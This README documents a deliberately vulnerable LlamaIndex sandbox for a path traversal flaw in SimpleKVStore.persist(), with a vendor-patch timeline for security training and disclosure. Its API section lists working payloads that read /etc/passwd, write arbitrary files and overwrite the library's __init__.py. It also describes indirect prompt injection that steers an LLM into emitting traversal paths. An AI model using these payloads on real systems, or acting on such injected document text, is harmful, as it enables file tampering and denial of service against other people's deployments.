# Vulnerable LlamaIndex Sandbox (v0.14.19–v0.14.21+)

A containerized sandbox environment demonstrating **critical Insecure Orchestration vulnerabilities** in `llama-index-core`. This sandbox exposes a path traversal flaw where `SimpleKVStore.persist()` accepts unvalidated `persist_path` parameters, enabling arbitrary file writes, framework configuration overwrites, and persistent Denial of Service (DoS). The sandbox simulates the vendor's response lifecycle across four distinct stages to demonstrate incomplete remediation.

| Field | Value |
|-------|-------|
| **Target** | LlamaIndex (`llama-index-core` v0.14.19 – v0.14.21+) |
| **CVSS v3.1** | **10.0 (Critical)** – AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| **CWE Chain** | CWE-22 (Path Traversal) → CWE-73 (Arbitrary File Write) → CWE-94 (Code Injection) |
| **Root Cause** | `SimpleKVStore.persist()` accepts `persist_path` without path anchoring or validation |
| **Research Paper** | [JDP-2026-003](https://jdp-security.github.io/security-research-papers/2026-05-12-llamaindex-selfnuke-disclosure.html) |
| **Author** | Jeff Ponte (JDP Security) |

> ⚠️ **SECURITY WARNING**  
> This sandbox environment contains live vulnerabilities and demonstration code. Run these containers **only** inside isolated, disposable local testing environments. Never expose these sandbox services or endpoints to public networks.

---

## Vulnerability Overview

### The Trust Gap

Traditional security: `User Input → Validation → System Call`  
Agentic AI security: `User Input → LLM → Validation → System Call`

The framework treats the LLM as **trusted middleware**, but the LLM is a non-deterministic text generator. When an attacker-controlled document contains indirect prompt injection, the LLM can be coerced into returning path traversal sequences like `../../tmp/pwned_storage`, which are passed directly to `StorageContext.persist()` without sanitization or canonicalization.

### Vulnerable Sinks & Production Vectors

1. **`dataset.py` (v0.14.19–v0.14.20 wheel):** Raw arbitrary-content write primitive providing direct Remote Code Execution (RCE) when writing executable Python or cron jobs. **DELETED by vendor in source as collateral cleanup.**
2. **`SimpleKVStore.persist()` (ALL versions):** JSON-serialized write primitive used for persistent DoS, config corruption, or secondary chaining steps. **NEVER PATCHED.**
3. **`StorageContext.persist()` Wrapper (Production Entry Point):** The primary real-world API used by developers to save index state. Passes untrusted user or LLM paths directly to the unpatched `SimpleKVStore.persist()` sink.

### Four-Stage Vendor Response Lifecycle

| Stage | Version | `dataset.py` status | `SimpleKVStore.persist()` | What actually happened |
|-------|---------|--------------------|---------------------------|------------------------|
| **0** | v0.14.19 | 🔴 Vulnerable (RCE) | 🔴 Vulnerable (DoS) | Baseline unpatched release; report filed |
| **1** | v0.14.20 | 🔴 Vulnerable (PyPI Drift) | 🔴 Vulnerable (DoS) | GitHub commit `7049c97d` deleted `dataset.py`, but PyPI wheel still shipped it |
| **2** | v0.14.21 | ❌ Deleted | 🔴 Vulnerable (DoS) | Actual wheel cleanup — `dataset.py` absent, RCE closed, persist flaw untouched |
| **3** | v0.14.21 + workflows 2.14.0 | ❌ Deleted | 🔴 Vulnerable (DoS) | Workflows dependency bumped, typo fixed in PR #21251, core persistence unchanged |

---

## Quick Start

### Prerequisites

- [Podman](https://podman.io/) or Docker
- [Make](https://www.gnu.org/software/make/)
- Python 3.10+

### Build and Run

```bash
cd sandboxes/agentic_local_llamaindex

# Build and start Stage 0 (default)
make attack

# Verify the service is running
curl http://localhost:8000/health
```

### Expected Health Response

```json
{
  "status": "ok",
  "llama_version": "0.14.19",
  "stage": 0,
  "dataset_functions_available": true,
  "sandbox_dir": "/app/sandbox_data",
  "init_integrity": "clean",
  "endpoints_available": ["/health", "/verify", "/migration", "/chat", "/agent/save_session"]
}
```

---

## API Endpoints

### `GET /health`

Returns sandbox status, LlamaIndex version, current stage, and available endpoints.

### `GET /verify`

Returns the integrity state of the core library (`__init__.py`). Checks for markers indicating persistent compromise.

* **Clean State:**
  ```json
  {
    "status": "clean",
    "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
    "exists": true,
    "clean": true,
    "markers_found": [],
    "size_bytes": 4224,
    "content_type": "python",
    "impact": "clean"
  }
  ```

* **Compromised State (DoS via JSON):**
  ```json
  {
    "status": "compromised",
    "markers_found": ["JSON OVERWRITE - DoS", "PERSISTENT COMPROMISE"],
    "content_type": "json",
    "impact": "dos_json"
  }
  ```

### `GET /migration`

Returns forensic analysis of repository actions across releases, verifying whether functions were refactored or simply deleted.

### `POST /chat`

Main interaction endpoint. Accepts a JSON body with a `query` field containing actions:

* **Read file via dataset.py (Stage 0 / 1):**
  ```json
  {
    "query": "peek:../../../../../../etc/passwd"
  }
  ```

* **Write file via SimpleKVStore.persist() (ALL stages):**
  ```json
  {
    "query": "drop:../../../../../../tmp/pwned.txt:EXPLOIT_SUCCESS"
  }
  ```

* **Corrupt core library (DoS via JSON overwrite, ALL stages):**
  ```json
  {
    "query": "nuke:import os; f=open('/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py', 'w'); f.write('{\\\"status\\\": \\\"corrupted\\\"}'); f.close()"
  }
  ```

### `POST /agent/save_session`

Simulates an AI agent saving a user's session to a workspace directory. Demonstrates real-world exploitation of `StorageContext.persist()`.

* **Malicious request (path traversal):**
  ```json
  {
    "client_name": "../../tmp/pwned_storage"
  }
  ```

---

## Stage Switching

The sandbox uses the `STAGE` variable passed to `make attack` to control the security posture and vendor response stage:

```bash
# Stage 0: Fully exposed (v0.14.19)
make attack STAGE=0

# Stage 1: PyPI Drift / Partial cleanup (v0.14.20)
make attack STAGE=1

# Stage 2: Hardened wheel cleanup (v0.14.21)
make attack STAGE=2

# Stage 3: Refactor illusion / Typo fix (v0.14.21 + workflows 2.14.0)
make attack STAGE=3
```

---

## Exploitation

The companion exploitation tools and interactive CLI trainer are located in:

```
exploitation/
└── llamaindex/
    ├── interactive_trainer.py      # Menu-driven CLI trainer (9 lessons)
    └── payloads/                   # Generated payload artifacts and templates
```

*Note: Custom payload files in `payloads/` are generated dynamically by `interactive_trainer.py` during exercises or loaded from static templates.*

### Interactive Trainer

```bash
cd exploitation/llamaindex
./interactive_trainer.py
```

---

## Container Management

```bash
# Stop the active container
make stop

# View active container logs
make logs

# Clean up build artifacts and containers
make clean

# Reset sandbox data state
make reset
```

---

## Files

| File | Purpose |
|------|---------|
| `Containerfile.stage0` | Python 3.11-slim build with `llama-index-core==0.14.19` |
| `Containerfile.stage1` | Python 3.11-slim build with `llama-index-core==0.14.20` |
| `Containerfile.stage2` | Python 3.11-slim build with `llama-index-core==0.14.21` |
| `Containerfile.stage3` | Python 3.11-slim build with `llama-index-core==0.14.21` + `llama-index-workflows==2.14.0` |
| `Makefile` | Build, run, stop, and stage-switching automation |
| `README.md` | Sandbox documentation |
| `app/server.py` | Vulnerable Flask API server exposing `/health`, `/verify`, `/migration`, `/chat`, and `/agent/save_session` |

---

## References

- JDP-2026-003 [LlamaIndex - Path Traversal to Arbitrary File Write and RCE](https://jdp-security.github.io/security-research-papers/2026-05-12-llamaindex-selfnuke-disclosure.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html)
- [Commit 7049c97d](https://github.com/run-llama/llama_index/commit/7049c97d) – `dataset.py` deleted as collateral cleanup
- [PR #21251 (e8b22d9)](https://github.com/run-llama/llama_index/commit/e8b22d9) – Typo fix in `data_sinks.py`
- [PR #21111 (17fba87d5)](https://github.com/run-llama/llama_index/commit/17fba87d5) – UTF-8 encoding fix for `SimpleKVStore`
- OWASP GenAI Security Project: [GenAI Red Team Lab](https://github.com/GenAI-Security-Project/GenAI-Red-Team-Lab/)
  
